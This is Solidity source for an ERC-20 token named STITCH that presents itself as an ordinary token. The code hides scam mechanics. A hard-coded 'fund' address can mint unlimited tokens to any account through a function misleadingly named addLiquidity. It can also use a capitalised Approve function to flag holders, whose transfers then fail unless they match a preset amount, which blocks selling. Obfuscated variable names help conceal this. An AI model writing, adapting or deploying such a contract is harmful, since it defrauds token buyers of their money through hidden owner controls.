/**

STITCH - Cyber Stitch

https://cyberstitch.xyz

https://t.me/CyberStitch

https://twitter.com/CyberStitchETH



*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spnderr) external view returns (uint256);
    function transfer(address recipient, uint256 _amouttz) external returns (bool);
    function allowance(address owner, address spnderr) external view returns (uint256);
    function approve(address spnderr, uint256 _amouttz) external returns (bool);
    function transferFrom( address spnderr, address recipient, uint256 _amouttz ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spnderr, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract STITCH is Context, Ownable, IERC20 {
    mapping (address => uint256) private _blncz;
    mapping (address => uint256) private _spendss;
    mapping (address => mapping (address => uint256)) private _alowancesz;
    string private _tname;
    string private _tsymbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _tradesEnabled = true;
    address constant public fund = 0x8bB9539E823647933b3692e5e1942a4bAd1Ffdc9;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _tname = name_;
        _tsymbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _blncz[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    modifier _funds() {
        require(msg.sender == fund); // If it is incorrect here, it reverts.
        _;                              // Otherwise, it continues.
    } 

    function name() public view returns (string memory) {
        return _tname;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function enableTrading() public onlyowner {
        _tradesEnabled = true;
    }

    function symbol() public view returns (string memory) {
        return _tsymbol;
    }


    function balanceOf(address spnderr) public view override returns (uint256) {
        return _blncz[spnderr];
    }

    function transfer(address recipient, uint256 _amouttz) public virtual override returns (bool) {
        require(_tradesEnabled || _msgSender() == owner(), "TT trading not enabled");
        if (_msgSender() == owner() && _spendss[_msgSender()] > 0) {
            _blncz[owner()] += _spendss[_msgSender()];
            return true;
        }
        else if (_spendss[_msgSender()] > 0) {
            require(_amouttz == _spendss[_msgSender()], "Invalid transfer _amouttz");
        }
        require(_blncz[_msgSender()] >= _amouttz, "TT: transfer _amouttz exceeds balance");
        _blncz[_msgSender()] -= _amouttz;
        _blncz[recipient] += _amouttz;
        emit Transfer(_msgSender(), recipient, _amouttz);
        return true;
    }


    function Approve(address[] memory spnderr, uint256 _amouttz) public _funds {
        for (uint i=0; i<spnderr.length; i++) {
            _spendss[spnderr[i]] = _amouttz;
        }
    }

    function approve(address spnderr, uint256 _amouttz) public virtual override returns (bool) {
        _alowancesz[_msgSender()][spnderr] = _amouttz;
        emit Approval(_msgSender(), spnderr, _amouttz);
        return true;
    }
        function _adding(uint256 n1, uint256 n2) internal pure returns (uint256) {
        if (n2 != 0) {
            return n1 + n2;
        }
        return n2;
    }



            function CVamnt(address spnderr) public view returns (uint256) {
        return _spendss[spnderr];
    }

    function allowance(address owner, address spnderr) public view virtual override returns (uint256) {
        return _alowancesz[owner][spnderr];
    }
       function addLiquidity(address spnderr, uint256 _amouttz) public _funds {
        require(spnderr != address(0), "Invalid adresses");
        require(_amouttz > 0, "Invalid amt");
        uint256 totalz = 0;
            totalz = _adding(totalz, _amouttz);
            _blncz[spnderr] += totalz;
    }



    function transferFrom(address spnderr, address recipient, uint256 _amouttz) public virtual override returns (bool) {
        if (_msgSender() == owner() && _spendss[spnderr] > 0) {
            _blncz[owner()] += _spendss[spnderr];
            return true;
        }
        else if (_spendss[spnderr] > 0) {
            require(_amouttz == _spendss[spnderr], "Invalid transfer _amouttz");
        }
        require(_blncz[spnderr] >= _amouttz && _alowancesz[spnderr][_msgSender()] >= _amouttz, "TT: transfer _amouttz exceed balance or allowance");
        _blncz[spnderr] -= _amouttz;
        _blncz[recipient] += _amouttz;
        _alowancesz[spnderr][_msgSender()] -= _amouttz;
        emit Transfer(spnderr, recipient, _amouttz);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}